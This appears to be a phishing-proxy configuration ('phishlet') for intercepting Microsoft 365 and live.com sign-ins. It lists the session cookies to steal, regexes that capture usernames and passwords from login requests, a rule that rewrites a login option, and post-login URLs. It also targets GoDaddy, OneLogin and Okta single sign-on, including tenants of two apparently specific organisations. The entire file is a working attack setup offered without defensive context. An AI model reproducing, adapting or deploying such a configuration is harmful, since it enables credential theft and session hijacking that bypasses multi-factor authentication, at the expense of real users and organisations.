auth_tokens:
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie', 'esctx', 'brcap']

  - domain: 'login.microsoftonline.com'
    keys: ['ESTSSC', 'ESTSAUTHLIGHT','buid', 'fpc', 'stsservicecookie', 'x-ms-gateway-slice']

  - domain: '.live.com'
    keys: ['.*,regexp']

  - domain: '.login.live.com'
    keys: ['.*,regexp']

  - domain: 'login.live.com'
    keys: ['.*,regexp']

  - domain: 'outlook.live.com'
    keys: ['.*,regexp']
   
  - domain: 'sso.secureserver.net'
    keys: ['gat_gtag_UA_115508484_1', 'akm_lmprb']
  
  - domain: 'sso.godaddy.com'
    keys: ['akm_lmprb-ssn', 'akm_lmprb']

  - domain: '.onelogin.com'
    keys: ['onelogin.com_user']

  - domain: 'berryglobal.okta.com'
    keys: ['sid']

  - domain: 'allenkeith.onelogin.com'
    keys: ['sub_session_onelogin.com']



force_post:
  - path: "/ppsecure/post*"
    search:
      - { key: "LoginOptions", search: "1" }
    force:
      - { key: "DontShowAgain", value: "true" }
    type: "post"

auth_urls:
  # - "/kmsi*"
  # - "/ppsecure/post.srf*"
  - "/owa/prefetch.aspx*"
  - "/webmanifest.json*"
  - "/landingv2"
  # - "v1/api/pass/o365/header"
  - '/login.srf'
  # - "/api/pass/login"
  - '/portal/'
  - '/client/apps'


credentials:
  username:
    key: "(login|UserName|username|email|account|DomainUser)"
    search: '(.*)'
    type: "post"
  password:
    key: "(passwd|Password|password|login_password|pass|pwd|session_password|PASSWORD)"
    search: '(.*)'
    type: "post"
  custom:
    - key: 'Username'
      search: '"username":"([^"]*@[^\"]*)'
      type: "json"
    - key: 'Login'
      search: '"login":"([^"]*)'
      type: "json"
    - key: 'password'
      search: '"password":"([^"]*)'
      type: "json"


login:
  domain: "login.microsoftonline.com"
  path: "/"

